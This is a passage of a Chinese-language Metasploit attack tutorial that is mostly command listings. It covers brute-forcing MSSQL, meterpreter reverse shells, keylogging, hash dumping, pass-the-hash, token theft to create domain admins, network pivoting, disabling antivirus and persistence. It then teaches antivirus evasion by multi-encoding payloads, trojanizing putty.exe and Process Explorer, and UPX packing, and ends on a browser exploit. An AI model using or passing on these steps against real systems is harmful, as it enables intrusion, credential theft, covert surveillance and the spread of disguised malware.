<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/mssql/mssql_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set verbose false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>暴力猜解登陆密码。接下来使用mssql自带的xp_cmdshell功能添加账户：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use exploit/windows/mssql/mssql_payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 433</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PASSWORD password130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>当获取到一个meterpreter shell 后可以执行更多的操作：</p>
<p>获取屏幕截图：<code>screenshot</code></p>
<p>获取系统信息：<code>sysinfo</code></p>
<p>获取键盘记录：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps  #查看目标机器进程，假设发现explorer.exe的进程号为1668:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; migrate 1668  #插入该进程</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/capture/keylog_recorder  #运行键盘记录模块，将击键记录保存到本地txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat /root/.msf3/loot/*****.txt  #查看结果</span><br></span></code></pre></div></div>
<p>获取系统账号密码：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/gather/hashdump</span><br></span></code></pre></div></div>
<p>当获取到密码的hash之后无法破解出明文密码且无法直接使用hash登陆，需要使用pass-the-hash技术：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/smb/psexec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门：</p>
<p>在目标机器上执行：<code>net uaer hacker pass /add</code></p>
<p>本地生成一个后门程序：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST=192.168.1.111 LPORT=443 X &gt;payload.exe</span><br></span></code></pre></div></div>
<p>将payload.exe拷贝到目标机器然后使用新建立的账号执行,本地执行端口监听，等待来自目标机器连接：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST=192.168.1.111 LPORT=443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getuid</span><br></span></code></pre></div></div>
<p>至此取得SYSTEM权限</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2令牌模拟">2、令牌模拟：<a href="#2令牌模拟" class="hash-link" aria-label="2、令牌模拟：的直接链接" title="2、令牌模拟：的直接链接">​</a></h3>
<p>当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps  # 查看目标机器进程，找出域控账户运行的进程ID，假如发现PID为380</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; steal_token 380</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#有时ps命令列出的进程中可能不存在域控账户的进程，此时使用incognito模块查看可用token：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use incognito</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; list_tokens –u  #列出可用token，假如找到域控token</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; impersonate_token SNEAKS.IN\\ihazdomainadmin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; add_user hacker password –h 192.168.1.50 #在域控主机上添加账户</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; add_group_user “Domain Admins” hacker –h 192.168.1.50  #将账户添加至域管理员组</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3内网渗透">3、内网渗透：<a href="#3内网渗透" class="hash-link" aria-label="3、内网渗透：的直接链接" title="3、内网渗透：的直接链接">​</a></h3>
<p>当取得同网段内一台主机的权限后可以进一步渗透网内其他主机：</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run get_local_subnets  #查看网段/子网</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Local subnet: 192.168.33.0/255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; background  #转入后台运行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; route add 192.168.33.0 255.255.255.0 1  #本地添加路由信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; route print #查看添加的信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use linux/samba/lsa_transnames_heap   #准备向内网目标主机进攻</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload linux/x86/shell/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 10.10.1.129 #此处为attacking主机的外网IP </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.33.132 #内网目标主机</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>也可以使用自动式添加路由模块：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; load auto_add_route</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; exploit</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4meterpreter脚本">4、Meterpreter脚本：<a href="#4meterpreter脚本" class="hash-link" aria-label="4、Meterpreter脚本：的直接链接" title="4、Meterpreter脚本：的直接链接">​</a></h3>
<p>使用run scriptname 方式执行</p>
<p>vnc脚本,获取远程机器vnc界面控制</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run vnc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run screen_unlock</span><br></span></code></pre></div></div>
<p>进程迁移</p>
<p>当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/manage/migrate</span><br></span></code></pre></div></div>
<p>（在64位win7中migrate需要管理员权限执行后门才能成功，而migrate前后获取的权限是有差异的。）</p>
<p>关闭杀毒软件</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run killav   （这个脚本要小心使用，可能导致目标机器蓝屏死机。）</span><br></span></code></pre></div></div>
<p>获取系统密码hash</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run hashdump</span><br></span></code></pre></div></div>
<p>（64位win7下需要管理员权限执行后门且先getsystem，然后使用</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">run  post/windows/gather/hashdump来dump hash成功率更高。</span><br></span></code></pre></div></div>
<p>而且如果要使用shell添加系统账户的话win7下得先：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">run post/windows/escalate/bypassuac  ，不然可能不会成功。）</span><br></span></code></pre></div></div>
<p>获取系统流量数据</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run packtrecorder –i 1</span><br></span></code></pre></div></div>
<p>直捣黄龙</p>
<p>可以干很多事情：获取密码，下载注册表，获取系统信息等</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run scraper</span><br></span></code></pre></div></div>
<p>持久保持</p>
<p>当目标机器重启之后仍然可以控制</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run persistence –X –i 50 –p 443 –r 192.168.1.111</span><br></span></code></pre></div></div>
<p>-X 开机启动  -i连接超时时间 –p端口 –rIP</p>
<p>下次连接时：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPOST 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>(会在以下位置和注册表以随机文件名写入文件等信息，如：</p>
<p>C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs</p>
<p>C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe</p>
<p>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP)</p>
<p>POST整合模块</p>
<p>可实现同时多个session操作</p>
<p>例子：获取hash</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/gather/hashdump</span><br></span></code></pre></div></div>
<p>其他还有很多，使用TAB键补全看下就知道</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="5升级command-shell">5、升级command shell<a href="#5升级command-shell" class="hash-link" aria-label="5、升级command shell的直接链接" title="5、升级command shell的直接  链接">​</a></h3>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; search ms08_067</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/shell/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set TARGET 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setg LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setg LPORT 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –z  #后台运行，如果此处未使用-z参数，后面可以按CTRL-Z转到后台</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –u 1  #升级shell，必须前面使用setg设定</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –i 2</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="6使用railgun操作windows-apis">6、使用Railgun操作windows APIs<a href="#6使用railgun操作windows-apis" class="hash-link" aria-label="6、使用Railgun操作windows APIs的直接链接" title="6、使用Railgun操作windows APIs的直接链接">​</a></h3>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; irb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;&gt;client.railgun.user32.MessageBoxA(o,”hello”,”world”,”MB_OK”)</span><br></span></code></pre></div></div>
<p>在目标机器上会弹出一个标题栏为world和内容为hello的窗口</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="七避开杀软">七．避开杀软<a href="#七避开杀软" class="hash-link" aria-label="七．避开杀软的直接链接" title="七．避开杀软的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1使用msfpayload创建可执行后门">1、使用msfpayload创建可执行后门：<a href="#1使用msfpayload创建可执行后门" class="hash-link" aria-label="1、使用msfpayload创建可执行后门：的直接链接" title="1、使用msfpayload创建可执行后门：的直接链接">​</a></h3>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp 0  #查看选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 X &gt; /var/www/payload1.exe</span><br></span></code></pre></div></div>
<p>然后本机监听端口</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use exploit/multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/shell_reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 31337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2过杀软---使用msfencode编码后门">2、过杀软---使用msfencode编码后门：<a href="#2过杀软---使用msfencode编码后门" class="hash-link" aria-label="2、过杀软---使用msfencode编码后门：的直接链接" title="2、过杀软---使用msfencode编码后门：的直接链接">​</a></h3>
<p>msfencode –l  #列出可用编码器</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode –e x86/shikata_ga_nai –t exe &gt; /var/www/payload2.exe</span><br></span></code></pre></div></div>
<p>使用 R参数作为raw输出至管道，再经过msfencode处理 ，最后导出。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3多次编码">3、多次编码：<a href="#3多次编码" class="hash-link" aria-label="3、多次编码：的直接链接" title="3、多次编码：的直接链接">​</a></h3>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/shikata_ga_nai –c 5 –t raw | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/alpha_upper –c 2 –t raw | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/shikata_ga_nai –c 5 –t raw | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/countdown –c 5 –t exe –o /var/www/payload3.exe</span><br></span></code></pre></div></div>
<p>简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17次循环编码。</p>
<p>（题外：经测试，1：使用此命令生成的后门也被MSE杀到；2：未编码的后门或编码次数较少的后门可以直接被秒杀；3：windows/x64/meterpreter/reverse_tcp生成的后门未经任何处理仍然不被杀，看来杀毒软件傻逼了；4：x86编码器编码的后门在64位机器上无法执行；5：360有个沙箱功能，后门文件右键选择“在360隔离沙箱中运行”，msf照样可以连接并操作，看来隔离沙箱功能有限。）</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4自定义可执行程序模板">4、自定义可执行程序模板：<a href="#4自定义可执行程序模板" class="hash-link" aria-label="4、自定义可执行程序模板：的直接链接" title="4、自定义可执行程序模板：的直接链接">​</a></h3>
<p>msfencode默认使用data/templates/templates.exe（msf v4在templates目录下有针对不同平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget http://download.sysinternals.com/Files/ProcessExplorer.zip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd work</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unzip ProcessExplorer.zip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd ..</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x work/procexp.exe –o /var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5</span><br></span></code></pre></div></div>
<p>在目标机器上运行，然后本地使用msfcli监听端口等待反弹连接：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 E</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="5暗度陈仓猥琐执行payload">5、暗度陈仓—猥琐执行payload：<a href="#5暗度陈仓猥琐执行payload" class="hash-link" aria-label="5、暗度陈仓—猥琐执行payload：的直接链接" title="5、暗度陈仓—猥琐执行payload：的直接链接">​</a></h3>
<p>绑定payload至一个可执行文件，让目标不知不觉间中招，以putty.exe为例：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x putty.exe -o /var/www/putty_backdoor.exe –e x86/shikata_ga_nai –k –c 5</span><br></span></code></pre></div></div>
<p>假如选择一个GUI界面的程序作为绑定目标并且不使用-k选项，则目标执行此程序的时候不会弹出cmd窗口，-k选项的作用是payload独立于模板软件的进程运行。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="6加壳">6、加壳：<a href="#6加壳" class="hash-link" aria-label="6、加壳：的直接链接" title="6、加壳：的直接链接">​</a></h3>
<p>msfencode部分编码器会增加程序体积，这时可使用壳（packer）来压缩程序，“带套之后 更保险”，例如UPX ：</p>
<p><code>apt-get install upx</code></p>
<p>最新版可到sf.net下载</p>
<p>使用方法：</p>
<p><code>upx -5 /var/www/payload3.exe</code></p>
<p>还有另外一个工具msfvenom结合了msfpayload和msfencode的功能  ，使用起来更省心，亲，一定要试试哦！过杀软总结起来就是多次编码和使用多种壳，终极大法就是使用自己编写的后门（市面上没有，被杀几率更低）。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="八使用用户端攻击方式client-side-attacks">八．使用用户端攻击方式(client-side attacks)<a href="#八使用用户端攻击方式client-side-attacks" class="hash-link" aria-label="八．使用用户端攻击方式(client-side attacks)的直接链接" title="八．使用用户端攻击方式(client-side attacks)的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1组合型攻击">1、组合型攻击<a href="#1组合型攻击" class="hash-link" aria-label="1、组合型攻击的直接链接" title="1、组合型攻击的直接链接">​</a></h3>
<p>主要指利用多种途径包括社会工程学方式攻击目标机器上安装的带有漏洞的程序如浏览 器，pdf阅读器，office软件等，最终获取系统权限。</p>
<p>基于浏览器的攻击：</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/browser/ms10_002_aurora</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SRVPORT 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set URIPATH /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –z</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –i 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run migrate</span><br></span></code></pre></div></div>
<p>或者:</p>
